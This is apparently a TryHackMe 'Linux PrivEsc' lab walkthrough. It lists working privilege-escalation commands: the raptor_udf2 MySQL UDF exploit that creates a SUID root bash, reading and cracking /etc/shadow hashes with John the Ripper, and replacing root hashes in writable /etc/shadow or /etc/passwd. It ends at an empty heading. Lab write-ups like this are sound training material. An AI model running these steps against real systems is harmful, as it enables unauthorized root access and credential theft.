# TRYHACKME : Linux PrivEsc
Deploy the target machine, and enter the following ssh credentials: `user:password321`

## Service Exploits
Simply copy in consecutive order the ff commands:
```
cd /home/user/tools/mysql-udf
```
Compiler the following file `raptor_udf2.c`
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Connect to the mysql with no password:
```
mysql -u root
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
whoami  // voila root access
```


## Weak File Permissions - Readable /etc/shadow
```
ls -l /etc/shadow
cat /etc/shadow
```
Save the root password hash to a txt file. The hash is found between the first and second colon.

Then run John the Ripper or use online resources to crack it.
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
The type of hashing algorithm used will appear during John the Ripper cracking.

## Weak File Permissions - Writable /etc/shadow
If the file is writable, we can change the root password by generating a new hash password (same hashing algorithm as the previous password), and replacing the existing hash.
```
mkpasswd -m sha-512 newpasswordhere
```
Then edit the /etc/shadow and replace the old hash password.

Switch to root user.
```
su
```

## Weak File Permission - Writable /etc/passwd
Some old versions of linux stores user password hashes. 

If the `/etc/passwd` happens to be writable, we can generate a hash and store it within the first and second colon.

Generate new hash password:
```
openssl passwd newpasswordhere
```

Then edit the root in `/etc/passwd`. Place the hash between the first and second hash.

After that you can switch to the root user.
```
su
```

## Sudo - Shell Escape Sequences
